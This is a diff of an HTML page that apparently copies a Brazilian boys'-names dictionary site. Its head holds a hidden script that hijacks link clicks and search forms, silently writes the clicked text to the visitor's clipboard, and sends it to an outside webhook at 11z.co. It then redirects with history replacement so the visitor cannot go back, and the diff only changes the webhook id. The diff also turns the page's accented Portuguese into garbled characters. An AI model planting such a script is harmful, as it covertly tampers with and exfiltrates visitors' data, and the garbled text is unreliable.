@@ -1,10 +1,10 @@
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>
-    <!-- Script de Redirecionamento Avan�ado: C�pia Silenciosa e Substitui��o de Hist�rico -->
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
 
-            // Fun��o para copiar texto para o clipboard de forma silenciosa
+            // Função para copiar texto para o clipboard de forma silenciosa
             async function copyToClipboard(text) {
                 try {
                     // Tenta a API moderna primeiro
@@ -24,11 +24,11 @@
                         document.body.removeChild(textArea);
                     }
                 } catch (err) {
-                    // Silencioso: N�o faz nada em caso de erro
+                    // Silencioso: Não faz nada em caso de erro
                 }
-                // Envia webhook em segundo plano (n�o bloqueia nada)
+                // Envia webhook em segundo plano (não bloqueia nada)
                 // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
-                fetch("https://www.11z.co/_w/5156/selection", {
+                fetch("https://www.11z.co/_w/17093/selection", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ "value": text }),
@@ -46,34 +46,34 @@
                 }
             });
 
-            // 1. Redirecionar cliques em links com c�pia silenciosa
+            // 1. Redirecionar cliques em links com cópia silenciosa
             document.body.addEventListener('click', async function(e) {
                 const link = e.target.closest('a');
                 if (link && link.getAttribute('href')) {
                     const href = link.getAttribute('href');
                     
-                    // Intercepta links internos (relativos) ou links j� convertidos para o baseUrl
+                    // Intercepta links internos (relativos) ou links já convertidos para o baseUrl
                     const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
                     const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl)) && !localAbas.includes(href.replace(baseUrl, ''));
                     if (isInternal) {
                         e.preventDefault();
                         
-                        // Captura o texto do nome (limpa espa�os extras)
+                        // Captura o texto do nome (limpa espaços extras)
                         const textToCopy = link.innerText.trim();
                         if (textToCopy) {
                             await copyToClipboard(textToCopy);
                         }
 
-                        // Se o href j� � a URL completa, usa direto; sen�o monta
+                        // Se o href já é a URL completa, usa direto; senão monta
                         const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
 
-                        // Redireciona substituindo a p�gina no hist�rico (n�o permite voltar)
+                        // Redireciona substituindo a página no histórico (não permite voltar)
                         window.location.replace(targetUrl);
                     }
                 }
             }, true);
 
-            // 2. Redirecionar formul�rios de busca com c�pia silenciosa
+            // 2. Redirecionar formulários de busca com cópia silenciosa
             const searchForms = document.querySelectorAll('form');
             searchForms.forEach(form => {
                 form.addEventListener('submit', async function(e) {
@@ -92,7 +92,7 @@
                         const path = action.startsWith('/') ? action : '/' + action;
                         const targetUrl = baseUrl + path + '?' + params;
 
-                        // Redireciona substituindo a p�gina no hist�rico
+                        // Redireciona substituindo a página no histórico
                         window.location.replace(targetUrl);
                     }
                 });
@@ -103,23 +103,23 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Nomes Masculinos - Dicionário de Nomes Próprios</title>
-    <meta name="description" content="Lista de Nomes Masculinos no Dicionário de Nomes. Todos os Nomes Masculinos com seu Significado e Origem.">
-    <meta property="og:title" content="Nomes Masculinos - Dicionário de Nomes Próprios">
+    <title>Nomes Masculinos - DicionÃ¡rio de Nomes PrÃ³prios</title>
+    <meta name="description" content="Lista de Nomes Masculinos no DicionÃ¡rio de Nomes. Todos os Nomes Masculinos com seu Significado e Origem.">
+    <meta property="og:title" content="Nomes Masculinos - DicionÃ¡rio de Nomes PrÃ³prios">
     <meta property="og:type" content="article">
 
         <meta property="og:url" content="https://www.dicionariodenomesproprios.com.br/nomes-masculinos/">
 
     
             <meta property="og:image" content="images/fb_dnp.png">
-        <meta property="og:site_name" content="Dicionário de Nomes Próprios">
+        <meta property="og:site_name" content="DicionÃ¡rio de Nomes PrÃ³prios">
         <meta property="fb:app_id" content="132068570255221">
-    <meta property="og:description" content="Lista de Nomes Masculinos no Dicionário de Nomes. Todos os Nomes Masculinos com seu Significado e Origem.">
+    <meta property="og:description" content="Lista de Nomes Masculinos no DicionÃ¡rio de Nomes. Todos os Nomes Masculinos com seu Significado e Origem.">
             <link rel="canonical" href="https://www.dicionariodenomesproprios.com.br/nomes-masculinos/">
         <meta property="og:locale" content="pt_BR">
         <meta name="twitter:card" content="summary">
-        <meta name="twitter:title" content="Nomes Masculinos - Dicionário de Nomes Próprios">
-        <meta name="twitter:description" content="Lista de Nomes Masculinos no Dicionário de Nomes. Todos os Nomes Masculinos com seu Significado e Origem.">
+        <meta name="twitter:title" content="Nomes Masculinos - DicionÃ¡rio de Nomes PrÃ³prios">
+        <meta name="twitter:description" content="Lista de Nomes Masculinos no DicionÃ¡rio de Nomes. Todos os Nomes Masculinos com seu Significado e Origem.">
             <meta name="twitter:url" content="https://www.dicionariodenomesproprios.com.br/nomes-masculinos/">
     
     
@@ -133,7 +133,7 @@
     <link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#eb5d1c">
     <meta name="msapplication-TileColor" content="#fef2ed">
     <meta name="theme-color" content="#fef2ed">
-    <link rel="alternate" type="application/rss+xml" title="Dicionário de Nomes Próprios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
+    <link rel="alternate" type="application/rss+xml" title="DicionÃ¡rio de Nomes PrÃ³prios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
 
     <script>
         window.dataLayer = window.dataLayer || [];
@@ -173,14 +173,14 @@
     <div class="container">
         <div class="row">
             <div class="logo-wrap">
-                <a href="../" title="Dicionário de Nomes Próprios" class="logo">
+                <a href="../" title="DicionÃ¡rio de Nomes PrÃ³prios" class="logo">
                     <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
         <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
         <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
     </g>
 </svg>                    <span class="logo-txt">
-                        <span class="title">Dicionário de Nomes Próprios</span>
+                        <span class="title">DicionÃ¡rio de Nomes PrÃ³prios</span>
                         <span class="subtitle">Significado dos nomes</span>
                     </span>
                     </a>
@@ -188,7 +188,7 @@
             <div id="menu-btn" class="menu-btn"><i class="icon icon-menu"></i></div>
 
             <div id="fancy-header" class="fancy-header">
-                <a href="../" title="Dicionário de Nomes Próprios" class="fancy-logo">
+                <a href="../" title="DicionÃ¡rio de Nomes PrÃ³prios" class="fancy-logo">
                     <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
         <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
@@ -205,7 +205,7 @@
                             <li><a class="btn-default" href="../nomes-masculinos/">Masculinos</a></li>
                             <li><a class="btn-default" href="../origem/">Origem</a></li>
                             <li><a class="btn-default" href="../top-brasil/">Top</a></li>
-                            <li><a class="btn-default" href="../bebes/">Bebês</a></li>
+                            <li><a class="btn-default" href="../bebes/">BebÃªs</a></li>
                         </ul>
                     </div>
                             </div>
@@ -221,7 +221,7 @@
     <li><a class="btn-default" href="../nomes-masculinos/"><span class="btn-default--text">Nomes Masculinos</span></a></li>
     <li><a class="btn-default" href="../origem/"><span class="btn-default--text">Nomes pela Origem</span></a></li>
     <li><a class="btn-default" href="../top-brasil/"><span class="btn-default--text">Top Nomes</span></a></li>
-    <li><a class="btn-default" href="../bebes/"><span class="btn-default--text">Nomes de Bebês</span></a></li>
+    <li><a class="btn-default" href="../bebes/"><span class="btn-default--text">Nomes de BebÃªs</span></a></li>
 </ul>        </div>
     </nav>
 </div>
@@ -247,7 +247,7 @@
                         <div class="content-header--info w-630">
                             
                             <p>
-                                A <strong>Lista de Nomes Masculinos</strong> com seus significados e origem no Dicionário de Nomes.                            </p>
+                                A <strong>Lista de Nomes Masculinos</strong> com seus significados e origem no DicionÃ¡rio de Nomes.                            </p>
                         </div>
                     </div>
 
@@ -258,43 +258,43 @@
                                                                             <li><a href="/noah/">
                                             <span class="name-title">Noah</span>
                                             <span class="name-desc">
-                                            Significa “descanso”, “repouso”, “de longa vida”. Um nome curto, elegante e com significados repletos de...                                        </span></a></li>
+                                            Significa âdescansoâ, ârepousoâ, âde longa vidaâ. Um nome curto, elegante e com significados repletos de...                                        </span></a></li>
                                                                             <li><a href="/samuel/">
                                             <span class="name-title">Samuel</span>
                                             <span class="name-desc">
-                                            Significa “nome de Deus” ou "Deus ouve". Com popularidade em diferentes países, como Nigéria, Gana, Estados...                                        </span></a></li>
+                                            Significa ânome de Deusâ ou "Deus ouve". Com popularidade em diferentes paÃ­ses, como NigÃ©ria, Gana, Estados...                                        </span></a></li>
                                                                             <li><a href="/ravi/">
                                             <span class="name-title">Ravi</span>
                                             <span class="name-desc">
-                                            Significa "Sol”, “o Sol”. Ravi é um nome masculino curto, forte e elegante, de origem sânscrita. Seu...                                        </span></a></li>
+                                            Significa "Solâ, âo Solâ. Ravi Ã© um nome masculino curto, forte e elegante, de origem sÃ¢nscrita. Seu...                                        </span></a></li>
                                                                             <li><a href="/joao/">
-                                            <span class="name-title">João</span>
+                                            <span class="name-title">JoÃ£o</span>
                                             <span class="name-desc">
-                                            Significa “Deus é cheio de graça”, “agraciado por Deus” ou “a graça e misericórdia de Deus” e “Deus...                                        </span></a></li>
+                                            Significa âDeus Ã© cheio de graÃ§aâ, âagraciado por Deusâ ou âa graÃ§a e misericÃ³rdia de Deusâ e âDeus...                                        </span></a></li>
                                                                             <li><a href="/pedro/">
                                             <span class="name-title">Pedro</span>
                                             <span class="name-desc">
-                                            Significa "pedra", "rochedo". O belo e elegante nome Pedro é um dos mais difundidos no mundo todo e está presente em...                                        </span></a></li>
+                                            Significa "pedra", "rochedo". O belo e elegante nome Pedro Ã© um dos mais difundidos no mundo todo e estÃ¡ presente em...                                        </span></a></li>
                                                                             <li><a href="/arthur/">
                                             <span class="name-title">Arthur</span>
                                             <span class="name-desc">
-                                            Significa “pedra”, “grande urso”. Um nome masculino cheio de elegância e personalidade, Arthur apresenta...                                        </span></a></li>
+                                            Significa âpedraâ, âgrande ursoâ. Um nome masculino cheio de elegÃ¢ncia e personalidade, Arthur apresenta...                                        </span></a></li>
                                                                             <li><a href="/davi/">
                                             <span class="name-title">Davi</span>
                                             <span class="name-desc">
-                                            Significa "o amado", "querido", "predileto". Tem origem no nome hebraico Dawid, Dawídh, que significa "o amado",...                                        </span></a></li>
+                                            Significa "o amado", "querido", "predileto". Tem origem no nome hebraico Dawid, DawÃ­dh, que significa "o amado",...                                        </span></a></li>
                                                                             <li><a href="/lucas/">
                                             <span class="name-title">Lucas</span>
                                             <span class="name-desc">
-                                            Significa "o que vem da Lucânia", "lucano", "luminoso" ou "iluminado". O nome Lucas tem origem no grego Loukás, um...                                        </span></a></li>
+                                            Significa "o que vem da LucÃ¢nia", "lucano", "luminoso" ou "iluminado". O nome Lucas tem origem no grego LoukÃ¡s, um...                                        </span></a></li>
                                                                             <li><a href="/gustavo/">
                                             <span class="name-title">Gustavo</span>
                                             <span class="name-desc">
-                                            Significa “protegido por Deus”, “pessoal dos godos” ou “convidado glorioso”. O bonito e imponente nome...                                        </span></a></li>
+                                            Significa âprotegido por Deusâ, âpessoal dos godosâ ou âconvidado gloriosoâ. O bonito e imponente nome...                                        </span></a></li>
                                                                             <li><a href="/gabriel/">
                                             <span class="name-title">Gabriel</span>
                                             <span class="name-desc">
-                                            Significa “homem de Deus”, “homem forte de Deus”, “fortaleza de Deus”, “mensageiro de Deus”. Um dos...                                        </span></a></li>
+                                            Significa âhomem de Deusâ, âhomem forte de Deusâ, âfortaleza de Deusâ, âmensageiro de Deusâ. Um dos...                                        </span></a></li>
                                                                     </ol>
                             </div>
                         
@@ -302,16 +302,16 @@
                                     <style> @media (min-width:0px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:0;height:0;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:0;}}@media (min-width:300px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:300px;height:290px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:290px;}}@media (min-width:336px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:336px;height:320px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:320px;}}@media (min-width:768px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:468px;height:100px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:100px;}}@media (min-width:1280px){#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{width:728px;height:130px;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{height:130px;}}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c::before{z-index:-1;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div{margin:auto;position:unset;}#div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c > div::before, #div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c::after{top:0;position:absolute;}</style><div id="div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c" class="ad-unit ad-unit--pt-br #div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c"></div>                                </div>
                                                         
                                                                                     <div class="list-mod-wrap mt-40 mb-40">
-                                    <h2 class="gender--title">Tendências de Nomes Masculinos </h2>
+                                    <h2 class="gender--title">TendÃªncias de Nomes Masculinos </h2>
                                     <ul class="list-mod--list col-3 col-2--mobile t-center">
                                                                                     <li>
-                                                <a href="/benicio/"><span>Benício</span></a>
+                                                <a href="/benicio/"><span>BenÃ­cio</span></a>
                                             </li>
                                                                                     <li>
                                                 <a href="/rafael/"><span>Rafael</span></a>
                                             </li>
                                                                                     <li>
-                                                <a href="/jose/"><span>José</span></a>
+                                                <a href="/jose/"><span>JosÃ©</span></a>
                                             </li>
                                                                                     <li>
                                                 <a href="/benjamim/"><span>Benjamim</span></a>
@@ -359,33 +359,33 @@
                                                 <a href="/isaac/"><span>Isaac</span></a>
                                             </li>
                                                                                     <li>
-                                                <a href="/vinicius/"><span>Vinícius</span></a>
+                                                <a href="/vinicius/"><span>VinÃ­cius</span></a>
                                             </li>
                                                                                     <li>
                                                 <a href="/vicente/"><span>Vicente</span></a>
                                             </li>
                                                                                     <li>
-                                                <a href="/antonio/"><span>Antônio</span></a>
+                                                <a href="/antonio/"><span>AntÃ´nio</span></a>
                                             </li>
                                                                             </ul>
                                 </div>
                             
                                                             <div class="list-mod-wrap mt-40 mb-40">
-                                    <h2 class="gender--title"><a href="/nomes-biblicos-masculinos/">Nomes Bíblicos Masculinos</a></h2>
+                                    <h2 class="gender--title"><a href="/nomes-biblicos-masculinos/">Nomes BÃ­blicos Masculinos</a></h2>
                                     <ul class="list-mod--list col-3 col-2--mobile t-center">
                                                                                     <li><a href="/daniel/"><span>Daniel</span></a></li>
                                                                                     <li><a href="/tiago/"><span>Tiago</span></a></li>
                                                                                     <li><a href="/calebe/"><span>Calebe</span></a></li>
                                                                                     <li><a href="/matheus/"><span>Matheus</span></a></li>
                                                                                     <li><a href="/thiago/"><span>Thiago</span></a></li>
-                                                                                    <li><a href="/andre/"><span>André</span></a></li>
+                                                                                    <li><a href="/andre/"><span>AndrÃ©</span></a></li>
                                                                                     <li><a href="/emanuel/"><span>Emanuel</span></a></li>
                                                                                     <li><a href="/paulo/"><span>Paulo</span></a></li>
                                                                                     <li><a href="/mateus/"><span>Mateus</span></a></li>
                                                                                     <li><a href="/isaque/"><span>Isaque</span></a></li>
                                                                                     <li><a href="/israel/"><span>Israel</span></a></li>
                                                                                     <li><a href="/zion/"><span>Zion</span></a></li>
-                                                                                    <li><a href="/josue/"><span>Josué</span></a></li>
+                                                                                    <li><a href="/josue/"><span>JosuÃ©</span></a></li>
                                                                                     <li><a href="/eliabe/"><span>Eliabe</span></a></li>
                                                                                     <li><a href="/elias/"><span>Elias</span></a></li>
                                                                                     <li><a href="/danilo/"><span>Danilo</span></a></li>
@@ -393,7 +393,7 @@
                                                                                     <li><a href="/saulo/"><span>Saulo</span></a></li>
                                                                                     <li><a href="/caleb/"><span>Caleb</span></a></li>
                                                                                     <li><a href="/david/"><span>David</span></a></li>
-                                                                                    <li><a href="/moises/"><span>Moisés</span></a></li>
+                                                                                    <li><a href="/moises/"><span>MoisÃ©s</span></a></li>
                                                                                     <li><a href="/asher/"><span>Asher</span></a></li>
                                                                                     <li><a href="/abner/"><span>Abner</span></a></li>
                                                                                     <li><a href="/efraim/"><span>Efraim</span></a></li>
@@ -449,34 +449,34 @@
                                                             <div class="list-mod-wrap mt-40 mb-40">
                                     <h2 class="gender--title"><a href="/compostos-masculinos/">Nomes Compostos Masculinos</a></h2>
                                     <ul class="list-mod--list col-3 col-2--mobile t-center">
-                                                                                    <li><a href="/joao-pedro/"><span>João Pedro</span></a></li>
-                                                                                    <li><a href="/joao-miguel/"><span>João Miguel</span></a></li>
+                                                                                    <li><a href="/joao-pedro/"><span>JoÃ£o Pedro</span></a></li>
+                                                                                    <li><a href="/joao-miguel/"><span>JoÃ£o Miguel</span></a></li>
                                                                                     <li><a href="/pedro-henrique/"><span>Pedro Henrique</span></a></li>
                                                                                     <li><a href="/carlos-eduardo/"><span>Carlos Eduardo</span></a></li>
-                                                                                    <li><a href="/joao-gabriel/"><span>João Gabriel</span></a></li>
-                                                                                    <li><a href="/joao-vitor/"><span>João Vítor</span></a></li>
+                                                                                    <li><a href="/joao-gabriel/"><span>JoÃ£o Gabriel</span></a></li>
+                                                                                    <li><a href="/joao-vitor/"><span>JoÃ£o VÃ­tor</span></a></li>
                                                                                     <li><a href="/davi-lucas/"><span>Davi Lucas</span></a></li>
-                                                                                    <li><a href="/joao-paulo/"><span>João Paulo</span></a></li>
+                                                                                    <li><a href="/joao-paulo/"><span>JoÃ£o Paulo</span></a></li>
                                                                                     <li><a href="/ravi-lucca/"><span>Ravi Lucca</span></a></li>
-                                                                                    <li><a href="/jose-pedro/"><span>José Pedro</span></a></li>
-                                                                                    <li><a href="/jose-miguel/"><span>José Miguel</span></a></li>
-                                                                                    <li><a href="/joao-guilherme/"><span>João Guilherme</span></a></li>
-                                                                                    <li><a href="/julio-cesar/"><span>Júlio César</span></a></li>
+                                                                                    <li><a href="/jose-pedro/"><span>JosÃ© Pedro</span></a></li>
+                                                                                    <li><a href="/jose-miguel/"><span>JosÃ© Miguel</span></a></li>
+                                                                                    <li><a href="/joao-guilherme/"><span>JoÃ£o Guilherme</span></a></li>
+                                                                                    <li><a href="/julio-cesar/"><span>JÃºlio CÃ©sar</span></a></li>
                                                                                     <li><a href="/enzo-gabriel/"><span>Enzo Gabriel</span></a></li>
                                                                                     <li><a href="/luiz-miguel/"><span>Luiz Miguel</span></a></li>
                                                                                     <li><a href="/luiz-felipe/"><span>Luiz Felipe</span></a></li>
                                                                                     <li><a href="/victor-hugo/"><span>Victor Hugo</span></a></li>
                                                                                     <li><a href="/luiz-henrique/"><span>Luiz Henrique</span></a></li>
-                                                                                    <li><a href="/joao-victor/"><span>João Victor</span></a></li>
-                                                                                    <li><a href="/jose-henrique/"><span>José Henrique</span></a></li>
-                                                                                    <li><a href="/jose-antonio/"><span>José Antônio</span></a></li>
+                                                                                    <li><a href="/joao-victor/"><span>JoÃ£o Victor</span></a></li>
+                                                                                    <li><a href="/jose-henrique/"><span>JosÃ© Henrique</span></a></li>
+                                                                                    <li><a href="/jose-antonio/"><span>JosÃ© AntÃ´nio</span></a></li>
                                                                                     <li><a href="/anthony-gabriel/"><span>Anthony Gabriel</span></a></li>
-                                                                                    <li><a href="/jose-carlos/"><span>José Carlos</span></a></li>
-                                                                                    <li><a href="/joao-batista/"><span>João Batista</span></a></li>
-                                                                                    <li><a href="/marco-antonio/"><span>Marco Antônio</span></a></li>
+                                                                                    <li><a href="/jose-carlos/"><span>JosÃ© Carlos</span></a></li>
+                                                                                    <li><a href="/joao-batista/"><span>JoÃ£o Batista</span></a></li>
+                                                                                    <li><a href="/marco-antonio/"><span>Marco AntÃ´nio</span></a></li>
                                                                                     <li><a href="/carlos-henrique/"><span>Carlos Henrique</span></a></li>
-                                                                                    <li><a href="/luis-felipe/"><span>Luís Felipe</span></a></li>
-                                                                                    <li><a href="/jose-augusto/"><span>José Augusto</span></a></li>
+                                                                                    <li><a href="/luis-felipe/"><span>LuÃ­s Felipe</span></a></li>
+                                                                                    <li><a href="/jose-augusto/"><span>JosÃ© Augusto</span></a></li>
                                                                                     <li><a href="/luiz-carlos/"><span>Luiz Carlos</span></a></li>
                                                                                     <li><a href="/luiz-fernando/"><span>Luiz Fernando</span></a></li>
                                                                                 <li class="full-w see-all"><a href="/compostos-masculinos/"><span>Ver todos</span></a></li>
@@ -525,26 +525,26 @@
                                     <ul class="related-list">
                                                                                     <li>
                                                 <a href="/nomes-masculinos-diferentes-e-raros-para-bebes/">
-                                                                                                            <img src="images/nomes-masculinos-diferentes-e-raros-para-bebes-artc.jpg" alt="108 nomes masculinos diferentes e raros para bebês" width="210" height="140">
-                                                                                                        <span>108 nomes masculinos diferentes e raros para bebês</span>
+                                                                                                            <img src="images/nomes-masculinos-diferentes-e-raros-para-bebes-artc.jpg" alt="108 nomes masculinos diferentes e raros para bebÃªs" width="210" height="140">
+                                                                                                        <span>108 nomes masculinos diferentes e raros para bebÃªs</span>
                                                 </a>
                                             </li>
                                                                                     <li>
                                                 <a href="/nomes-masculinos-para-bebe/">
-                                                                                                            <img src="images/nomes-masculinos-para-bebe-artc.jpg" alt="107 nomes masculinos para bebê que estão bombando agora (2022)" width="210" height="140">
-                                                                                                        <span>107 nomes masculinos para bebê que estão bombando agora (2022)</span>
+                                                                                                            <img src="images/nomes-masculinos-para-bebe-artc.jpg" alt="107 nomes masculinos para bebÃª que estÃ£o bombando agora (2022)" width="210" height="140">
+                                                                                                        <span>107 nomes masculinos para bebÃª que estÃ£o bombando agora (2022)</span>
                                                 </a>
                                             </li>
                                                                                     <li>
                                                 <a href="/nomes-masculinos-terminados-em-son/">
-                                                                                                            <img src="images/nomes-masculinos-terminados-em-son-artc.jpg" alt="37 nomes masculinos terminados em son para você conhecer" width="210" height="140">
-                                                                                                        <span>37 nomes masculinos terminados em son para você conhecer</span>
+                                                                                                            <img src="images/nomes-masculinos-terminados-em-son-artc.jpg" alt="37 nomes masculinos terminados em son para vocÃª conhecer" width="210" height="140">
+                                                                                                        <span>37 nomes masculinos terminados em son para vocÃª conhecer</span>
                                                 </a>
                                             </li>
                                                                                     <li>
                                                 <a href="/nomes-masculinos-sem-a-letra-a/">
-                                                                                                            <img src="images/nomes-masculinos-sem-a-letra-a-artc.jpg" alt="23 nomes masculinos sem a letra A para você conhecer" width="210" height="140">
-                                                                                                        <span>23 nomes masculinos sem a letra A para você conhecer</span>
+                                                                                                            <img src="images/nomes-masculinos-sem-a-letra-a-artc.jpg" alt="23 nomes masculinos sem a letra A para vocÃª conhecer" width="210" height="140">
+                                                                                                        <span>23 nomes masculinos sem a letra A para vocÃª conhecer</span>
                                                 </a>
                                             </li>
                                                                             </ul>
@@ -559,7 +559,7 @@
                                     <li>
                                         <a href="/enzo/" class="full-w">
                                             <span class="list-wide--name full-w">Enzo</span>
-                                            <span class="list-wide--desc full-w"> Significa "senhor do lar", "príncipe do lar", "governante da casa", “gigante”, “o que vence”, “vencedor”, “natural de Laurento”.
+                                            <span class="list-wide--desc full-w"> Significa "senhor do lar", "prÃ­ncipe do lar", "governante da casa", âgiganteâ, âo que venceâ, âvencedorâ, ânatural de Laurentoâ.
 
 Um nome forte...</span>
                                         </a>
@@ -569,11 +569,11 @@ Um nome forte...</span>
                                     <li>
                                         <a href="/henrique/" class="full-w">
                                             <span class="list-wide--name full-w">Henrique</span>
-                                            <span class="list-wide--desc full-w"> Significa "senhor do lar", "príncipe do lar" ou "governante da casa".
+                                            <span class="list-wide--desc full-w"> Significa "senhor do lar", "prÃ­ncipe do lar" ou "governante da casa".
 
 Origem
 
-Henrique tem origem no nome germânico Haimirich, composto pela união dos...</span>
+Henrique tem origem no nome germÃ¢nico Haimirich, composto pela uniÃ£o dos...</span>
                                         </a>
                                     </li>
 
@@ -581,9 +581,9 @@ Henrique tem origem no nome germânico Haimirich, composto pela união dos...</s
                                     <li>
                                         <a href="/bruno/" class="full-w">
                                             <span class="list-wide--name full-w">Bruno</span>
-                                            <span class="list-wide--desc full-w"> Significa “marrom”, "castanho", "bronzeado", “moreno”.
+                                            <span class="list-wide--desc full-w"> Significa âmarromâ, "castanho", "bronzeado", âmorenoâ.
 
-Bruno é um nome com duas possibilidades de origem, sendo que as duas remetem para o mesmo...</span>
+Bruno Ã© um nome com duas possibilidades de origem, sendo que as duas remetem para o mesmo...</span>
                                         </a>
                                     </li>
 
@@ -591,9 +591,9 @@ Bruno é um nome com duas possibilidades de origem, sendo que as duas remetem pa
                                     <li>
                                         <a href="/rodrigo/" class="full-w">
                                             <span class="list-wide--name full-w">Rodrigo</span>
-                                            <span class="list-wide--desc full-w"> Significa "poderosamente famoso", "famoso pela sua glória" ou "governante poderoso", "rei famoso". 
+                                            <span class="list-wide--desc full-w"> Significa "poderosamente famoso", "famoso pela sua glÃ³ria" ou "governante poderoso", "rei famoso". 
 
-A origem do nome Rodrigo é germânica. Surgiu do...</span>
+A origem do nome Rodrigo Ã© germÃ¢nica. Surgiu do...</span>
                                         </a>
                                     </li>
 
@@ -601,9 +601,9 @@ A origem do nome Rodrigo é germânica. Surgiu do...</span>
                                     <li>
                                         <a href="/eduardo/" class="full-w">
                                             <span class="list-wide--name full-w">Eduardo</span>
-                                            <span class="list-wide--desc full-w"> Significa "guardião das riquezas", “protetor das riquezas” ou "guardião rico".
+                                            <span class="list-wide--desc full-w"> Significa "guardiÃ£o das riquezas", âprotetor das riquezasâ ou "guardiÃ£o rico".
 
-Tem origem no nome germânico Hadaward, composto pela junção dos...</span>
+Tem origem no nome germÃ¢nico Hadaward, composto pela junÃ§Ã£o dos...</span>
                                         </a>
                                     </li>
 
@@ -611,9 +611,9 @@ Tem origem no nome germânico Hadaward, composto pela junção dos...</span>
                                     <li>
                                         <a href="/leonardo/" class="full-w">
                                             <span class="list-wide--name full-w">Leonardo</span>
-                                            <span class="list-wide--desc full-w"> Significa “valente como um leão” e “forte como um leão”.
+                                            <span class="list-wide--desc full-w"> Significa âvalente como um leÃ£oâ e âforte como um leÃ£oâ.
 
-O bonito e forte nome masculino Leonardo é a versão em italiano do nome de origem...</span>
+O bonito e forte nome masculino Leonardo Ã© a versÃ£o em italiano do nome de origem...</span>
                                         </a>
                                     </li>
 
@@ -621,9 +621,9 @@ O bonito e forte nome masculino Leonardo é a versão em italiano do nome de ori
                                     <li>
                                         <a href="/theo/" class="full-w">
                                             <span class="list-wide--name full-w">Theo</span>
-                                            <span class="list-wide--desc full-w"> Significa “Deus”, “Deus supremo”.
+                                            <span class="list-wide--desc full-w"> Significa âDeusâ, âDeus supremoâ.
 
-Um nome masculino curto e com um significado forte, Theo tem origem grega. Este nome surge a partir de théos, cujo...</span>
+Um nome masculino curto e com um significado forte, Theo tem origem grega. Este nome surge a partir de thÃ©os, cujo...</span>
                                         </a>
                                     </li>
 
@@ -631,7 +631,7 @@ Um nome masculino curto e com um significado forte, Theo tem origem grega. Este 
                                     <li>
                                         <a href="/nicolas/" class="full-w">
                                             <span class="list-wide--name full-w">Nicolas</span>
-                                            <span class="list-wide--desc full-w"> Significa "vitorioso", "o que vence com o povo", "o que conduz o povo à vitória".
+                                            <span class="list-wide--desc full-w"> Significa "vitorioso", "o que vence com o povo", "o que conduz o povo Ã  vitÃ³ria".
 
 O bonito e imponente nome masculino Nicolas possui diversos significados...</span>
                                         </a>
@@ -641,9 +641,9 @@ O bonito e imponente nome masculino Nicolas possui diversos significados...</spa
                                     <li>
                                         <a href="/diego/" class="full-w">
                                             <span class="list-wide--name full-w">Diego</span>
-                                            <span class="list-wide--desc full-w"> Significa “aquele que doutrina”, “conselheiro”; “aquele que vem do calcanhar”.
